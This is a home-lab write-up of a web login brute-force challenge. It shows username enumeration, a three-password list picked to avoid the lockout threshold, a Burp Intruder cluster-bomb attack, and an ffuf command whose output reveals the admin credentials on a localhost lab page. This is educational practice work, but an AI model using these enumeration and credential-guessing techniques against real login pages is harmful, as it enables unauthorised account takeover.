# Challange

**Warning: Accounts will lock after 5 failed login attempts!**

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/5d11e1e5-9dca-4236-bb79-154b0f6511b9)

- On trying a random username and password we got 1 incorrect login attempt.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/5ccbd5ae-28b0-437a-b456-4492418c2956)

- While submitting another random username and password we revert nothing, so here is the indication that the admin user exists.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d38a332f-aa91-4d4a-b83e-9724fb096615)

- We will make a list of the top 3 most used passwords to not let the accounts lock.
  - Passwords: letmein, 123456, teashop
- Next, we will intercept the request and send it to the intruder.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/8e81949b-4f3f-492a-8e87-f8344d6d3046)

- Next, we will use the attack method as cluster bomb load the username list and the top 3 passwords.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/8d801b11-f8b0-452d-8a7f-80954cefd934)

- After clicking on start attack we have got the user `admin` and password `letmein`.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/f7836e5b-7c95-48a8-8643-c5824f135260)

- On entering the details of user admin and password letmein. We have successfully logged in.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a831f884-01aa-4c5f-9d02-280d82955450)

## Alternate:

- We can use the tool called ffuf,wffuf, and hydra to achieve the same. This time let's use ffuf.
- For using ffuf we need to copy the request and save it to a file in the local machine.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/7c34c88a-ae73-4e0d-a0dc-2af13089893e)

- On saving the request to the file, we need to do some modifications to the file by defining the arguments to get suitable results.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/f33c1da9-ad50-42a7-bd5d-ea48165b37ff)

- Make a file of the top 3 passwords.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d5f9a155-f04a-42f9-9085-dd15755c9d97)

- By using the command: `ffuf -request reqs.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/usernames-shortlist.txt:FUZZUSER -fs 3376,3256`

```bash
└─$ ffuf -request reqs.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/share/wordlists/seclists/SecLists-master/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3376,3256

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/labs/a0x03.php
 :: Wordlist         : FUZZPASS: /home/singhx/labs/PEH/XSS/pass.txt
 :: Wordlist         : FUZZUSER: /usr/share/wordlists/seclists/SecLists-master/Usernames/top-usernames-shortlist.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Connection: close
 :: Header           : Cookie: PHPSESSID=bcbc6597490163fa9ed394d5f5145dcd
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Host: localhost
 :: Header           : Origin: http://localhost
 :: Header           : Referer: http://localhost/labs/a0x03.php
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZUSER&password=FUZZPASS
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 3376,3256
________________________________________________

[Status: 200, Size: 3378, Words: 1270, Lines: 68, Duration: 3ms]
    * FUZZPASS: letmein
    * FUZZUSER: admin

:: Progress: [51/51] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
- Got the same credentials.
